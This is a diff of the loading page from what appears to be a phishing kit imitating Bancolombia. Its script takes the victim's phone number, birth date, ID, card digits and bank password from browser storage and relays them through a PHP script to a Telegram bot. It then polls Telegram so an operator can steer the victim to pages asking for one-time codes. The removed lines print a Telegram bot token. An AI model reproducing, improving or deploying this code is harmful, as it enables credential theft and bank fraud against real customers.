@@ -1,103 +1,113 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificando Datos</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: url('img/fondo.jpg') no-repeat center center fixed;
-            background-size: cover;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificando Datos</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: url('img/fondo.jpg') no-repeat center center fixed;
+      background-size: cover;
+    }
 
-        .blur-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.4);
-            backdrop-filter: blur(10px);
-        }
+    .blur-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.4);
+      backdrop-filter: blur(10px);
+    }
 
-        .loaderp-full {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            position: fixed;
-            width: 90%;
-            height: 90%;
-            z-index: 9999;
-        }
+    .loaderp-full {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      position: fixed;
+      width: 90%;
+      height: 90%;
+      z-index: 9999;
+    }
 
-        .loaderp {
-            width: 180px; /* Tamaño del círculo */
-            height: 180px; /* Tamaño del círculo */
-            background-image: url('img/circulo.png'); /* Carga la imagen del círculo */
-            background-size: cover; /* Hace que la imagen cubra todo el círculo */
-            border-radius: 50%; /* Forma el círculo */
-            position: relative; /* Necesario para posicionar el loader dentro */
-            display: flex;
-            flex-direction: column; /* Centra el texto debajo del loader */
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-        }
+    .loaderp {
+      width: 180px;
+      height: 180px;
+      background-image: url('img/circulo.png');
+      background-size: cover;
+      border-radius: 50%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
 
-        .loaderp .loader {
-            width: 30px; /* Tamaño del loader (gris) */
-            height: 30px; /* Tamaño del loader (gris) */
-            border: 5px solid #f3f3f3; /* Hacer el borde más delgado (antes era 10px) */
-            border-top: 5px solid #555; /* Hacer el borde superior más delgado (antes era 10px) */
-            border-radius: 50%;
-            animation: spin 1s linear infinite; /* Animación de giro */
-        }
+    .loaderp .loader {
+      width: 30px;
+      height: 30px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #555;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
 
-        .loaderp-text {
-            margin-top: 30px; /* Espacio entre el loader y el texto */
-            font-size: 13px;
-            color: black;
-        }
+    .loaderp-text {
+      margin-top: 30px;
+      font-size: 13px;
+      color: black;
+    }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-    <div class="blur-overlay"></div>
-    <div class="loaderp-full">
-        <div class="loaderp">
-            <div class="loader"></div> <!-- Este es el loader gris que gira -->
-            <div class="loaderp-text">Cargando...</div> <!-- Texto debajo del loader -->
-        </div>
+  <div class="blur-overlay"></div>
+  <div class="loaderp-full">
+    <div class="loaderp">
+      <div class="loader"></div>
+      <div class="loaderp-text">Cargando...</div>
     </div>
+  </div>
 
 <script>
 document.addEventListener('DOMContentLoaded', async function () {
-  const loader = document.querySelector('#loader');
-  const botToken = "8153542950:AAER3soWgrkQDu_cVSUZR4x9dJKjavcGSDE";
+  const loader = document.querySelector('.loaderp-full');
 
-  // 1. Leer datos guardados del usuario
+  // 1. Cargar configuración del bot
+  const config = await fetch("botconfig.json").then(r => r.json()).catch(err => {
+    alert("No se pudo cargar la configuración del bot.");
+    console.error(err);
+    return null;
+  });
+
+  if (!config || !config.token || !config.chat_id) {
+    alert("Configuración incompleta del bot.");
+    return;
+  }
+
+  // 2. Leer datos del localStorage
   const data = JSON.parse(localStorage.getItem("bancoldata") || "{}");
-
   if (!data.celular || !data.nacimiento || !data.tipo || !data.identificador || !data.digitosFinales || !data.clave) {
-    alert("Información incompleta. Redirigiendo...");
+    alert("Datos incompletos. Redirigiendo...");
     return window.location.href = "index.html";
   }
 
+  // 3. Crear ID de transacción
   const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
   localStorage.setItem("transactionId", transactionId);
 
-  // 2. Crear mensaje
+  // 4. Crear mensaje
   const mensaje = `
 📥 <b>REGISTRO NUEVO</b>
 🆔 ID: ${transactionId}
@@ -109,7 +119,7 @@ document.addEventListener('DOMContentLoaded', async function () {
 🔐 Clave: ${data.clave}
 `;
 
-  // 3. Crear botones
+  // 5. Botones
   const keyboard = {
     inline_keyboard: [
       [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
@@ -120,22 +130,20 @@ document.addEventListener('DOMContentLoaded', async function () {
     ]
   };
 
-  // 4. Enviar mensaje a Telegram con botones
+  // 6. Enviar mensaje con botones a Telegram
   await fetch("botmaster2.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  // 5. Escuchar botón presionado
-  await checkButton(transactionId);
+  // 7. Verificar botón presionado
+  await checkButton(transactionId, config.token);
 
-  async function checkButton(transactionId) {
+  async function checkButton(transactionId, botToken) {
     try {
       const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
       const json = await res.json();
-
-      if (!json.result) throw new Error("Sin resultados");
 
       const update = json.result.find(u =>
         u.callback_query &&
@@ -153,14 +161,12 @@ document.addEventListener('DOMContentLoaded', async function () {
           confirm_finalizar: "Finalización Exitosa"
         }[tipo] || "Acción desconocida";
 
-        // Notificar a Telegram
         await fetch("sendStatus.php", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ status })
         });
 
-        // Redirigir según tipo
         switch (tipo) {
           case "pedir_dinamica":
             return window.location.href = "dinacol.php";
@@ -175,11 +181,11 @@ document.addEventListener('DOMContentLoaded', async function () {
             return window.location.href = "https://www.bancolombia.com/personas";
         }
       } else {
-        setTimeout(() => checkButton(transactionId), 2000);
+        setTimeout(() => checkButton(transactionId, botToken), 2500);
       }
-    } catch (e) {
-      console.error("Error al verificar botón:", e);
-      setTimeout(() => checkButton(transactionId), 2000);
+    } catch (err) {
+      console.error("Error al verificar botón:", err);
+      setTimeout(() => checkButton(transactionId, botToken), 3000);
     }
   }
 });
